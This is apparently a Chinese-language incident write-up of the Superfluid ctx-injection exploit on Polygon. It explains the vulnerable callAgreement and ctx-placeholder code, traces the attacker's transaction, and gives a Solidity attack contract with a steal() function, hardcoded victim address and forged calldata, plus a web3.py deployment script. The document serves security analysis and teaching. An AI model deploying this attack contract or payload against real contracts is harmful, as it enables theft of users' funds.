# Super Fluid攻击事件分析

## 事件描述

Polygon 原生稳定币协议 QiDaoProtocol 官方发推称，流式数字资产协议 Superfluid 上的 QI Vesting 合约已被利用，QiDao 合约上的用户资金仍然安全，该漏洞利用仅在 Superfluid 上。

## Super Fluid项目描述

### 概览

SuperFluid是一个部署在以太坊Layer1上的智能合约框架，使用户可以按照提前自定义的规则来转移链上资产。只需要一个交易就可以达到使资产自动的从一个地址转到另一个地址的行为。

作为一个流交易处理框架，SuperFluid最主要实现的功能就是实现交易的自动化，也就是说按照预先设定的规则自动的完成转账。由于以太坊合约本身不支持自动运行，所以流交易的自动化实现还是会依赖于链下程序的操作。

那么什么是流交易？使用场景是什么？其实流交易的愿景在于实现可编程的货币，实现交易的自动分发和按时序汇款。比如我有一笔资金需要按时分次数打给一个账户，并且存在其他逻辑，比如如果你的账户余额超过一个阈值我就停止汇款。由于智能合约不能自动运行，所以这样的逻辑需要手动实现。SuperFluid就实现了这么样的一个框架来实现这样的逻辑。

SuperFluid本身支持两个基本的原子操作：资金分发和持续性转账。当用户创建了一个资金流，那么其他一系列的操作最终都是由以上两种基本功能来组成。这两种基本功能，SuperFluid分别用两种协定来表示：

对于资金分发，SuperFluid采用Instant Distribution Agreement（IDA）来表示，对于持续性转账，则使用Constant Flow Agreement（CFA）来表示。

对于用户自定义的高级操作，一些更为复杂的逻辑，SuperFluid为了实现将这些复杂功能集合到一笔交易之中，定义了一个名为批处理调用的功能。用户可以将一些基本操作打包同一个批处理调用的data中。

## 漏洞分析

漏洞点发生在callAgreement函数：

```solidity
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes memory callData,
        bytes memory userData
    )
        external override
        returns(bytes memory returnedData)
    {
        return _callAgreement(msg.sender, agreementClass, callData, userData);
    }
...
    function _callAgreement(
        address msgSender,
        ISuperAgreement agreementClass,
        bytes memory callData,
        bytes memory userData
    )
        internal
        cleanCtx
        isAgreement(agreementClass)
        returns(bytes memory returnedData)
    {
        // beaware of the endiness
        bytes4 agreementSelector = CallUtils.parseSelector(callData);

        //Build context data
        bytes memory  ctx = _updateContext(Context({
            appLevel: isApp(ISuperApp(msgSender)) ? 1 : 0,
            callType: ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT,
            // solhint-disable-next-line not-rely-on-time 
            timestamp: block.timestamp,
            msgSender: msgSender,
            agreementSelector: agreementSelector,
            userData: userData,
            appAllowanceGranted: 0,
            appAllowanceWanted: 0,
            appAllowanceUsed: 0,
            appAddress: address(0),
            appAllowanceToken: ISuperfluidToken(address(0))
        }));
        bool success;
        (success, returnedData) = _callExternalWithReplacedCtx(address(agreementClass), callData, ctx);
        if (!success) {
            revert(CallUtils.getRevertMsg(returnedData));
        }
        // clear the stamp
        _ctxStamp = 0;
    }
```

callAgreement函数调用内部函数\_callAgreement，将msg.sender和其他的参数传入。\_callAgreement首先将参数calldata中的函数签名提取出来，然后构造一个名为ctx的变量。

那么这个ctx变量是什么呢？这里可以参考一下SuperFluid的官方文档：https://docs.superfluid.finance/superfluid/protocol-developers/guides/user-data

> Context is used for several key items within the Superfluid protocol such as gas optimization, governance, security, and SuperApp callbacks. One parameter that's also available for use within the context field is userData

其结构定义如下：

```solidity

struct Context {
        //
        // Call context
        //
        // callback level
        uint8 appLevel;
        // type of call
        uint8 callType;
        // the system timestsamp
        uint256 timestamp;
        // The intended message sender for the call
        address msgSender;

        //
        // Callback context
        //
        // For callbacks it is used to know which agreement function selector is called
        bytes4 agreementSelector;
        // User provided data for app callbacks
        bytes userData;

        //
        // App context
        //
        // app allowance granted
        uint256 appAllowanceGranted;
        // app allowance wanted by the app callback
        uint256 appAllowanceWanted;
        // app allowance used, allowing negative values over a callback session
        int256 appAllowanceUsed;
        // app address
        address appAddress;
        // app allowance in super token
        ISuperfluidToken appAllowanceToken;
    }

```

可以看到这个ctx结构体中存储了SuperFluid内部协议间通信的各种必要参数。在\_callAgreement函数中，根据用户传入的参数打包一个ctx出来，而后调用\_callExternalWithReplacedCtx函数。

\_callExternalWithReplacedCtx函数逻辑如下：

```solidity
    function _callExternalWithReplacedCtx(
        address target,
        bytes memory callData,
        bytes memory ctx
    )
        private
        returns(bool success, bytes memory returnedData)
    {
        assert(target != address(0));

        // STEP 1 : replace placeholder ctx with actual ctx
        callData = _replacePlaceholderCtx(callData, ctx);

        // STEP 2: Call external with replaced context
        // FIXME make sure existence of target due to EVM rule
        // solhint-disable-next-line avoid-low-level-calls 
        (success, returnedData) = target.call(callData);

        if (success) {
            require(returnedData.length > 0, "SF: APP_RULE_CTX_IS_EMPTY");
        }
    }
    ...
    function _replacePlaceholderCtx(bytes memory data, bytes memory ctx)
        internal pure
        returns (bytes memory dataWithCtx)
    {
        // 1.a ctx needs to be padded to align with 32 bytes boundary
        uint256 dataLen = data.length;

        // Double check if the ctx is a placeholder ctx
        //
        // NOTE: This can't check all cases - user can still put nonzero length of zero data
        // developer experience check. So this is more like a sanity check for clumsy app developers.
        //
        // So, agreements MUST NOT TRUST the ctx passed to it, and always use the isCtxValid first.
        {
            uint256 placeHolderCtxLength;
            // NOTE: len(data) is data.length + 32 https://docs.soliditylang.org/en/latest/abi-spec.html
            // solhint-disable-next-line no-inline-assembly
            assembly { placeHolderCtxLength := mload(add(data, dataLen)) }
            require(placeHolderCtxLength == 0, "SF: placerholder ctx should have zero length");
        }

        // 1.b remove the placeholder ctx
        // solhint-disable-next-line no-inline-assembly
        assembly { mstore(data, sub(dataLen, 0x20)) }

        // 1.c pack data with the replacement ctx
        return abi.encodePacked(
            data,
            // bytes with padded length
            uint256(ctx.length),
            ctx, new bytes(CallUtils.padLength32(ctx.length) - ctx.length) // ctx padding
        );
        // NOTE: the alternative placeholderCtx is passing extra calldata to the agreements
        // agreements would use assembly code to read the ctx
        // Because selector is part of calldata, we do the padding internally, instead of
        // outside
    }
```

\_callExternalWithReplacedCtx首先会调用\_replacePlaceholderCtx函数来处理calldata和ctx。这里引入了一个新的概念：placeholder，翻译过来就是占位符，那么是干什么的呢？这里是官方解释：https://github.com/superfluid-finance/protocol-monorepo/wiki/About-Placeholder-Ctx

大体意思就是说为了使得calldata和ctx更好的结合在一起（序列化），在传入calldata的时候，需要在calldata结尾加一串0，作为结尾的标志，\_callExternalWithReplacedCtx函数就会将这个placeholder给剔除，换成真正的ctx。

简而言之，这个函数就是干了两件事：1.去除了calldata后面的0（占位符）2.将calldata和ctx连一块返回。

当占位符被剔除后，这个序列化的datawithctx就会被作为calldata来调用agreement里面的函数。

这里面，调用什么函数是由calldata来进行决定的，这给了用户很大的自由空间，为了保证安全性，所以在调用agreement中的函数时都会验证ctx的合法性。由于所有的ctx打包处理工作都是由合约本身来操作（比如上述的callAgreement），所以按理说ctx不会出什么问题。

但是问题就是出现在这段逻辑中：由于calldata没有长度规定，用户可以自己在calldata的结尾，这样序列化后的calldatawithctx在结尾就有了两个ctx参数。当传入agreement等外部合约进行合约间通信的时候，原本用于确认消息可靠性的ctx不会被函数接收，处理的是用户自己构造的ctx。

那么这个ctx里面有哪些敏感的参数被攻击者控制之后会导致资产的丢失呢？重新分析callAgreement函数我们可以看到，函数在打包ctx的时候，msgsender、selector和userdata比较重要：

```solidity
bytes memory  ctx = _updateContext(Context({
            appLevel: isApp(ISuperApp(msgSender)) ? 1 : 0,
            callType: ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT,
            // solhint-disable-next-line not-rely-on-time 
            timestamp: block.timestamp,
            msgSender: msgSender,
            agreementSelector: agreementSelector,
            userData: userData,
            appAllowanceGranted: 0,
            appAllowanceWanted: 0,
            appAllowanceUsed: 0,
            appAddress: address(0),
            appAllowanceToken: ISuperfluidToken(address(0))
        }));
```

其中selector是从calldata里面的函数签名，userdata是用于实现一些高级逻辑的自定义字段，这两个参数都是在正常逻辑中用户可控的字段，而msgsender则是在callAgreement函数调用内部\_callAgreement时传入，写死为真正的msg.sender。那么这个msgsender在后面的逻辑中有什么用呢？这里我们举一个例子，分析一下CFA合约中的函数：

```solidity
    /// @dev IConstantFlowAgreementV1.createFlow implementation
    function createFlow(
        ISuperfluidToken token,
        address receiver,
        int96 flowRate,
        bytes calldata ctx
    )
        external
        override
        returns(bytes memory newCtx)
    {
        FlowParams memory flowParams;
        require(receiver != address(0), "CFA: receiver is zero");
        ISuperfluid.Context memory currentContext = AgreementLibrary.authorizeTokenAccess(token, ctx);
        flowParams.flowId = _generateFlowId(currentContext.msgSender, receiver);
        flowParams.sender = currentContext.msgSender;
        flowParams.receiver = receiver;
        flowParams.flowRate = flowRate;
        flowParams.userData = currentContext.userData;
        require(flowParams.sender != flowParams.receiver, "CFA: no self flow");
        require(flowParams.flowRate > 0, "CFA: invalid flow rate");
        (bool exist, FlowData memory oldFlowData) = _getAgreementData(token, flowParams.flowId);
        require(!exist, "CFA: flow already exist");

        if (ISuperfluid(msg.sender).isApp(ISuperApp(receiver)))
        {
            newCtx = _changeFlowToApp(
                receiver,
                token, flowParams, oldFlowData,
                ctx, currentContext, FlowChangeType.CREATE_FLOW);
        } else {
            newCtx = _changeFlowToNonApp(
                token, flowParams, oldFlowData,
                ctx, currentContext);
        }

        _requireAvailableBalance(token, currentContext);
    }
```

createFlow函数用于创造一个资金流，资金流的源头是根据ctx中的msgsender来获取的。那么如果我们利用漏洞，就可以伪造msgsender的地址，就可以绕过验证随意的创造资金流了。

## 攻击流程分析

攻击发生在polygon网络，交易hash：0x396b6ee91216cf6e7c89f0c6044dfc97e84647f5007a658ca899040471ab4d67

这里我们利用https://dashboard.tenderly.co/平台来分析整个的攻击交易序列

由于攻击者直接交互的接口合约是代理合约所以所有的合约函数调用都是通过代理合约的fallback方法来进行调用的：

![image-20220225160944280](https://s3cunDa.github.io/assets/post/image-20220225160944280.png)

在这里，攻击者首先调用了realtimeBalanceOf函数来查询受害者victim地址的余额，参数和查询结果如下：

```
{
  "account": "0x5073c1535a1a238e7c7438c553f1a2baac366cee",
  "timestamp": "1644301024"
}
{
  "availableBalance": "16818386482145059198434304",
  "deposit": "3085455555558098599936",
  "owedDeposit": "0"
}
```

而后，攻击者调用漏洞函数callAgreement，参数如下：

```
{
  "msgSender": "0x32d47ba0affc9569298d4598f7bf8348ce8da6d4",
  "agreementClass": "0xb0aabba4b2783a72c52956cdef62d438eca2d7a1",
  "callData": "0x232d2b58000000000000000000000000e1ca10e6a10c0f72b74df6b7339912babfb1f8b500000000000000000000000000000000000000000000000000000000000181e500000000000000000000000032d47ba0affc9569298d4598f7bf8348ce8da6d40000000000000000000000000000000000000000000de96e8ede785e47c37c0000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000002a000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005073c1535a1a238e7c7438c553f1a2baac366cee000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
  "userData": "0x"
}
```

不难发现攻击者按照之前分析的攻击逻辑已经把伪造的ctx附加在了calldata中，其中msgsender被攻击者改成了之前查询的受害者地址0x5073c1535a1a238e7c7438c553f1a2baac366cee，当执行完\_replacePlaceholderCtx函数后，与之前预期的一样，两个ctx被附加到calldata后：

```
{
  "dataWithCtx": "0x232d2b58000000000000000000000000e1ca10e6a10c0f72b74df6b7339912babfb1f8b500000000000000000000000000000000000000000000000000000000000181e500000000000000000000000032d47ba0affc9569298d4598f7bf8348ce8da6d40000000000000000000000000000000000000000000de96e8ede785e47c37c0000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000002a000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005073c1535a1a238e7c7438c553f1a2baac366cee000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000062020ae000000000000000000000000032d47ba0affc9569298d4598f7bf8348ce8da6d4232d2b580000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
}
```

此时，函数签名为0x232d2b58，即updateSubscription函数，这个函数是IDA协定类型，函数的源代码如下：

```solidity
    /// @dev IInstantDistributionAgreementV1.updateSubscription implementation
    function updateSubscription(
        ISuperfluidToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    )
        external override
        returns(bytes memory newCtx)
    {
        _SubscriptionOperationVars memory vars;
        AgreementLibrary.CallbackInputs memory cbStates;
        bytes memory userData;
        address publisher;
        {
            ISuperfluid.Context memory context = AgreementLibrary.authorizeTokenAccess(token, ctx);
            userData = context.userData;
            publisher = context.msgSender;
        }

        (
            vars.iId,
            vars.sId,
            vars.idata,
            vars.subscriptionExists,
            vars.sdata
        ) = _loadAllData(token, publisher, subscriber, indexId, false);

        cbStates = AgreementLibrary.createCallbackInputs(
            token,
            subscriber,
            vars.sId,
            "");
        newCtx = ctx;

        // before-hook callback
        if (vars.subscriptionExists) {
            cbStates.noopBit = SuperAppDefinitions.BEFORE_AGREEMENT_UPDATED_NOOP;
            vars.cbdata = AgreementLibrary.callAppBeforeCallback(cbStates, newCtx);
        } else {
            cbStates.noopBit = SuperAppDefinitions.BEFORE_AGREEMENT_CREATED_NOOP;
            vars.cbdata = AgreementLibrary.callAppBeforeCallback(cbStates, newCtx);
        }

        // update publisher data
        if (vars.subscriptionExists && vars.sdata.subId != _UNALLOCATED_SUB_ID) {
            // if the subscription exist and not approved, update the approved units amount

            // update total units
            vars.idata.totalUnitsApproved = (
                uint256(vars.idata.totalUnitsApproved) +
                uint256(units) -
                uint256(vars.sdata.units)
            ).toUint128();
            token.updateAgreementData(vars.iId, _encodeIndexData(vars.idata));
        } else if (vars.subscriptionExists) {
            // if the subscription exists and approved, update the pending units amount

            // update pending subscription units of the publisher
            vars.idata.totalUnitsPending = (
                uint256(vars.idata.totalUnitsPending) +
                uint256(units) -
                uint256(vars.sdata.units)
            ).toUint128();
            token.updateAgreementData(vars.iId, _encodeIndexData(vars.idata));
        } else {
            // if the E_NO_SUBS, create it and then update the pending units amount

            // create unallocated subscription
            vars.sdata = SubscriptionData({
                publisher: publisher,
                indexId: indexId,
                subId: _UNALLOCATED_SUB_ID,
                units: units,
                indexValue: vars.idata.indexValue
            });
            token.createAgreement(vars.sId, _encodeSubscriptionData(vars.sdata));

            vars.idata.totalUnitsPending = vars.idata.totalUnitsPending.add(units, "IDA: E_OVERFLOW");
            token.updateAgreementData(vars.iId, _encodeIndexData(vars.idata));
        }

        int256 balanceDelta = int256(vars.idata.indexValue - vars.sdata.indexValue) * int256(vars.sdata.units);

        // adjust publisher's deposit and balances if subscription is pending
        if (vars.sdata.subId == _UNALLOCATED_SUB_ID) {
            _adjustPublisherDeposit(token, publisher, -balanceDelta);
            token.settleBalance(publisher, -balanceDelta);
        }

        // settle subscriber static balance
        token.settleBalance(subscriber, balanceDelta);

        // update subscription data if necessary
        if (vars.subscriptionExists) {
            vars.sdata.indexValue = vars.idata.indexValue;
            vars.sdata.units = units;
            token.updateAgreementData(vars.sId, _encodeSubscriptionData(vars.sdata));
        }

        // after-hook callback
        if (vars.subscriptionExists) {
            cbStates.noopBit = SuperAppDefinitions.AFTER_AGREEMENT_UPDATED_NOOP;
            AgreementLibrary.callAppAfterCallback(cbStates, vars.cbdata, newCtx);
        } else {
            cbStates.noopBit = SuperAppDefinitions.AFTER_AGREEMENT_CREATED_NOOP;
            AgreementLibrary.callAppAfterCallback(cbStates, vars.cbdata, newCtx);
        }

        emit IndexUnitsUpdated(token, publisher, indexId, subscriber, units, userData);
        emit SubscriptionUnitsUpdated(token, subscriber, publisher, indexId, units, userData);
    }

```

这个函数的作用就是更新IDA的信息，在这里攻击者把自己的地址传入了subscriber中，也就是走入了这个分支：

```solidity
else {
            // if the E_NO_SUBS, create it and then update the pending units amount

            // create unallocated subscription
            vars.sdata = SubscriptionData({
                publisher: publisher,
                indexId: indexId,
                subId: _UNALLOCATED_SUB_ID,
                units: units,
                indexValue: vars.idata.indexValue
            });
            token.createAgreement(vars.sId, _encodeSubscriptionData(vars.sdata));

            vars.idata.totalUnitsPending = vars.idata.totalUnitsPending.add(units, "IDA: E_OVERFLOW");
            token.updateAgreementData(vars.iId, _encodeIndexData(vars.idata));
        }
```

最后，完成转账：

```solidity
// adjust publisher's deposit and balances if subscription is pending
        if (vars.sdata.subId == _UNALLOCATED_SUB_ID) {
            _adjustPublisherDeposit(token, publisher, -balanceDelta);
            token.settleBalance(publisher, -balanceDelta);
        }
```

至此，一轮攻击到此结束，攻击者将受害者的资产转入了自己的账户中。

当然，攻击者还攻击了其他的用户，不过流程与上述流程大同小异，这里就不赘述了。

## 攻击复现

使用hardhat框架fork攻击前的polygon网络：

```
npx hardhat node --fork https://polygon-mainnet.g.alchemy.com/v2/<key> --fork-block-number 24685145
```

代理合约地址：0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3

这里根据攻击逻辑，需要调用callAgreement函数，将伪造的ctx附加在calldata，但是hardhatfork的网络节点似乎有一些问题，不知道是项目本身还是fork的原因，攻击并不会成功，且查询相关的受害者balance竟然是0（在正常攻击过程中这一个值不为0），尝试了多个区块高度还是同样的结果。万般无奈只得放弃复现的过程，这里把攻击代码贴一下：

攻击合约：

```solidity
pragma solidity ^ 0.8.0;
interface ISuperfluid {
     function callAgreement(
         ISuperAgreement agreementClass,
         bytes calldata callData,
         bytes calldata userData
     )
        external
        //cleanCtx
        returns(bytes memory returnedData);
    struct Context {
        //
        // Call context
        //
        // callback level
        uint8 appLevel;
        // type of call
        uint8 callType;
        // the system timestsamp
        uint256 timestamp;
        // The intended message sender for the call
        address msgSender;

        //
        // Callback context
        //
        // For callbacks it is used to know which agreement function selector is called
        bytes4 agreementSelector;
        // User provided data for app callbacks
        bytes userData;

        //
        // App context
        //
        // app allowance granted
        uint256 appAllowanceGranted;
        // app allowance wanted by the app callback
        uint256 appAllowanceWanted;
        // app allowance used, allowing negative values over a callback session
        int256 appAllowanceUsed;
        // app address
        address appAddress;
    }

    function decodeCtx(bytes calldata ctx)
        external pure
        returns (Context memory context);

    function isCtxValid(bytes calldata ctx) external view returns (bool);

    /**************************************************************************
    * Batch call
    **************************************************************************/
    /**
     * @dev Batch operation data
     */
    struct Operation {
        // Operation. Defined in BatchOperation (Definitions.sol)
        uint32 operationType;
        // Operation target
        address target;
        // Data specific to the operation
        bytes data;
    }

}
interface ISuperAgreement {

    /**
     * @dev Initialize the agreement contract
     */
    function initialize() external;

    /**
     * @dev Get the type of the agreement class.
     */
    function agreementType() external view returns (bytes32);

    /**
     * @dev Calculate the real-time balance for the account of this agreement class.
     * @param account Account the state belongs to
     * @param time Future time used for the calculation.
     * @return dynamicBalance Dynamic balance portion of real-time balance of this agreement.
     * @return deposit Account deposit amount of this agreement.
     * @return owedDeposit Account owed deposit amount of this agreement.
     */
    function realtimeBalanceOf(
        address token,
        address account,
        uint256 time
    )
        external
        view
        returns (
            int256 dynamicBalance,
            uint256 deposit,
            uint256 owedDeposit
        );

}
interface IDA{
    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx)
            external
            virtual
            returns(bytes memory newCtx);
    
}
interface IStoken{
    function balanceOf(address account) external view  returns(uint256 balance);
}
contract attack{
    address owner;
    address proxy = 0xEBbe9a6688be25d058C9469Ee4807E5eF192897f;
    address victim = 0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE;
    address agreement = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address token = 0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5;
    uint32 index = 98789;
    constructor(){
        owner = msg.sender;
    }
    function checkBalance() public view returns(uint){
        return IStoken(0x6177a480240D3248849f4B65e421E0b296522F21).balanceOf(victim);
    }
    function steal() public {
        bytes memory c_data = hex'232d2b58000000000000000000000000e1ca10e6a10c0f72b74df6b7339912babfb1f8b500000000000000000000000000000000000000000000000000000000000181e500000000000000000000000032d47ba0affc9569298d4598f7bf8348ce8da6d40000000000000000000000000000000000000000000de96e8ede785e47c37c0000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000002a000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005073c1535a1a238e7c7438c553f1a2baac366cee000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000';
        bytes memory u_data = "0x";
        ISuperfluid(proxy).callAgreement(
            ISuperAgreement(agreement),
            c_data,
            u_data
        );
    }
}
```

Exp:

```python
from web3 import Web3
import web3
from solcx import compile_source
import asyncio
import json
#import sha3
import time
from web3.middleware import geth_poa_middleware
my_ipc = Web3.HTTPProvider("http://127.0.0.1:8545")
assert my_ipc.isConnected()
w3 = Web3(my_ipc)
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
myaccount = "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266"
privatekey = "ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
proxycontract = "0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
#contract = Web3.toChecksumAddress(contract)

def attack():
    acct = w3.eth.account.from_key(privatekey) 
    with open('exp.abi', 'r') as f:
        abi = json.load(f)
    f.close()
    with open('exp.bytecode', 'r') as f:
        code = f.read()
    f.close()
    bytecode = code.replace("\n", "")
    hack_contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    construct_txn = hack_contract.constructor().buildTransaction({
    "chainId": 137,
    'from': acct.address,
    'nonce': w3.eth.getTransactionCount(acct.address),
    'gas': 30000000,
    'gasPrice': w3.toWei('21', 'gwei')})

    signed = acct.signTransaction(construct_txn) 
    tx_id = w3.eth.sendRawTransaction(signed.rawTransaction) 
    print(tx_id.hex())
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_id)
    hacker = w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)
    print(hex(hacker.functions.checkBalance().call()))
    input()
    hacker.functions.steal().call()

def handle_event(event):
    print(event)

def log_loop(event_filter, poll_interval):
    while True:
        for event in event_filter.get_new_entries():
            handle_event(event)
            time.sleep(poll_interval)

if __name__ == '__main__':
    print(w3.eth.getBlock('latest')['number'])
    attack()
    block_filter = w3.eth.filter({'fromBlock':'latest', 'address':"0x07711bb6dfbc99a1df1f2d7f57545a67519941e7"})
    log_loop(block_filter, 2)

```



## 总结

此类安全漏洞的成因在于开发者对于设计上由合约本身构造的数据过于信任，敏感数据在后续的每一步使用和处理中都需要检查其合法性。虽然SuperFluid开发者对于ctx的有效性专门设置了一个hash值作为校验，但是在后续的处理中没有保证每一步都进行验证，最终导致了这一攻击事件的发生。所以对于开发者和安全审计人员来说一定要确保敏感数据的合法性检查。

### 补救措施

1. 在打包calldata与ctx时，对打包后的数据进行一个检查。
2. 换一个calldata和ctx的打包顺序，使得ctx在前面，提取出函数选择子。